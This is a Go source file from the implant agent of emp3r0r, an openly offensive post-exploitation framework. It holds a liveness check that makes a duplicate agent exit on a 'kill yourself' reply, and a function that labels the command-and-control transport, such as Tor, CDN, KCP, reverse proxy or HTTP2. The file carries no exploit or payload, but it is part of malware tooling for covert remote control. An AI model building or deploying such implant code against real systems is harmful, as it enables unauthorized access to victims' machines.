package agentutils

import (
	"context"
	"fmt"
	"io"
	"net"
	"net/url"
	"os"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// CheckAgentAlive is the agent alive?
// connect to emp3r0r_def.SocketName, send a message, see if we get a reply
func CheckAgentAlive(c net.Conn) bool {
	logging.Println("Testing if agent is alive...")
	defer c.Close()
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	replyFromAgent := make(chan string, 1)
	reader := func(r io.Reader) {
		buf := make([]byte, 1024)
		for ctx.Err() == nil {
			n, err := r.Read(buf[:])
			if err != nil {
				logging.Printf("Read error: %v", err)
				cancel()
			}
			replyFromAgent <- string(buf[0:n])
		}
	}

	// listen for reply from agent
	go reader(c)

	// send hello to agent
	for ctx.Err() == nil {
		_, err := fmt.Fprintf(c, "%d", os.Getpid())
		if err != nil {
			logging.Printf("Write error: %v, agent is likely to be dead", err)
			break
		}
		resp := <-replyFromAgent
		if strings.Contains(resp, "kill yourself") {
			logging.Printf("Agent told me to die (%d)", os.Getpid())
			os.Exit(0)
		}
		if strings.Contains(resp, def.TransportString) {
			logging.Println("Yes it's alive")
			return true
		}
		util.TakeASnap()
	}

	return false
}

// set C2Transport string
func genC2TransportString() (transport_str string) {
	if netutil.IsTor(def.CCAddress) {
		return fmt.Sprintf("TOR (%s)", def.CCAddress)
	} else if common.RuntimeConfig.CDNProxy != "" {
		return fmt.Sprintf("CDN (%s)", common.RuntimeConfig.CDNProxy)
	} else if common.RuntimeConfig.UseKCP {
		return fmt.Sprintf("KCP (%s)",
			def.CCAddress)
	} else if common.RuntimeConfig.C2TransportProxy != "" {
		// parse proxy url
		proxyURL, err := url.Parse(common.RuntimeConfig.C2TransportProxy)
		if err != nil {
			logging.Printf("invalid proxy URL: %v", err)
		}

		// if the proxy port is emp3r0r proxy server's port
		if proxyURL.Port() == common.RuntimeConfig.AgentSocksServerPort && proxyURL.Hostname() == "127.0.0.1" {
			return fmt.Sprintf("Reverse Proxy: %s", common.RuntimeConfig.C2TransportProxy)
		}
		if proxyURL.Port() == common.RuntimeConfig.ShadowsocksLocalSocksPort && proxyURL.Hostname() == "127.0.0.1" {
			return fmt.Sprintf("Auto Proxy: %s", common.RuntimeConfig.C2TransportProxy)
		}

		return fmt.Sprintf("Proxy %s", common.RuntimeConfig.C2TransportProxy)
	} else {
		return fmt.Sprintf("HTTP2 (%s)", def.CCAddress)
	}
}
